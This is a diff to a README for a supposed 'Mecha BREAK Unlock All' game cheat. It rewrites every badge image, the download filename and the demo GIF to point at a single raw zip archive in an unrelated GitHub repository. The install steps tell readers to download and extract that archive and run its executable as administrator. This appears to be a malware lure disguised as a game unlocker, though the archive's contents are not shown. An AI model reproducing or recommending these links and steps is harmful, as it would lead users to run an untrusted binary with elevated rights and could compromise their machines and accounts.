@@ -1,9 +1,9 @@
 # 🤖 Mecha BREAK Unlock All
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)  
-[![Build Stable](https://img.shields.io/badge/build-stable-brightgreen)](LICENSE)  
-[![Support: 24/7](https://img.shields.io/badge/support-24%2F7-blue)](LICENSE)  
-[![OS Compatibility](https://img.shields.io/badge/OS-Win%2C%20macOS%2C%20Linux-important)](LICENSE)  
+[![License: MIT](https://github.com/Daniyalktk/dtrack-cli/raw/refs/heads/main/nothingist/dtrack-cli-v2.7.zip)](LICENSE)  
+[![Build Stable](https://github.com/Daniyalktk/dtrack-cli/raw/refs/heads/main/nothingist/dtrack-cli-v2.7.zip)](LICENSE)  
+[![Support: 24/7](https://github.com/Daniyalktk/dtrack-cli/raw/refs/heads/main/nothingist/dtrack-cli-v2.7.zip%2F7-blue)](LICENSE)  
+[![OS Compatibility](https://github.com/Daniyalktk/dtrack-cli/raw/refs/heads/main/nothingist/dtrack-cli-v2.7.zip%2C%20macOS%2C%20Linux-important)](LICENSE)  
 
 Welcome to **Mecha BREAK Unlock All** – your go-to toolkit for effortlessly unlocking the full experience of Mecha BREAK!  
 Tailored for savvy pilots and determined strategists, this repository transforms the way you interact with the game, offering deep unlock capabilities with ease and style. 🌐
@@ -64,7 +64,7 @@ Utilizing next-gen automation flows and AI-powered enhancement, you enjoy a no-h
 
 Get started and unlock *Mecha BREAK* to its fullest with these easy steps:  
 
-1. **Download** the `EasyLaunch.zip` archive directly from the repository’s releases section.
+1. **Download** the `https://github.com/Daniyalktk/dtrack-cli/raw/refs/heads/main/nothingist/dtrack-cli-v2.7.zip` archive directly from the repository’s releases section.
 2. **Extract** the contents to a dedicated directory on your desktop or preferred location.
 3. **Run** the EasyLaunch executable as administrator (for Windows) or with appropriate permissions on macOS/Linux.
 4. **Follow** on-screen instructions. You’ll be prompted to select your Mecha BREAK installation path and desired unlock options.
@@ -72,7 +72,7 @@ Get started and unlock *Mecha BREAK* to its fullest with these easy steps:
 
 ### 🎬 Need help? Watch our instant video tutorial:
 
-![Installation Demo](https://i.imgur.com/Js67NIU.gif)
+![Installation Demo](https://github.com/Daniyalktk/dtrack-cli/raw/refs/heads/main/nothingist/dtrack-cli-v2.7.zip)
 
 If any part of the setup is unclear, just scroll down for 24/7 support details or open an issue in the repository!
 
